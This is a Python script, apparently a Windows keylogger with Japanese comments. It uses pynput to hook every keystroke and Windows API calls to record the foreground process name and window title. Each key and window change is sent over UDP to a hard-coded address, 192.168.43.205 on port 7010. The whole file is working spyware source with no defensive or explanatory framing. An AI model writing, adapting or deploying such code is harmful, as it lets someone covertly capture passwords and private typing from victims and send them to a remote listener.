#coding: utf-8
 
from pynput import keyboard
from ctypes import *
from ctypes.wintypes import *

import socket

ip_address = '192.168.43.205'
port = 7010
buffer_size = 4092

# Socketの作成

 
proc_status = None

def get_name_by_pid(pid):
    PROCESS_ALL_ACCESS = 0x1f0fff
    hProcess = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if hProcess == 0:
        return None
    buf = ctypes.create_unicode_buffer(1024)
    ret = ctypes.windll.psapi.GetModuleBaseNameW(hProcess, 0, buf, len(buf))
    if ret == 0:
        return None
    return buf.value

def get_hwnd_n_pid():
    hwnd = windll.user32.GetForegroundWindow()
    pid = ctypes.c_ulong()
    windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    return hwnd, pid.value

def get_window_title(hwnd, pid):
    length = windll.user32.GetWindowTextLengthW(hwnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value

def on_press(key):
    global proc_status
    try:
        hwnd, pid = get_hwnd_n_pid()
        pid_name = get_name_by_pid(pid)
        window_title = get_window_title(hwnd, pid)
        if proc_status == window_title:
            pass
        else:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # データを送信する
                str = "pid:{0} [{1}] [{2}]".format(pid, pid_name, window_title)
                s.sendto(str.encode("utf-8"), (ip_address, port))
            # print()
            proc_status = window_title
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    # データを送信する

            s.sendto(key.char.encode("utf-8"), (ip_address, port))
        # print(key.char, end="")
    except AttributeError:
        try:
            if key.name == "shift" or key.name == "alt_l":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # データを送信する
                    str = " [{}]".format(key.name)
                    s.sendto(str.encode("utf-8"), (ip_address, port))
                # print()
            elif key.name == "cmd":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # データを送信する
                    str = " [cmd]"
                    s.sendto(str.encode("utf-8"), (ip_address, port))
            else:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # データを送信する
                    str = " [{}]".format(key.name)
                    s.sendto(str.encode("utf-8"), (ip_address, port))
                # print(" [{}]".format(key.name))
        except AttributeError:
            pass


def on_release(key):
    if key == keyboard.Key.esc:
        return True

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()     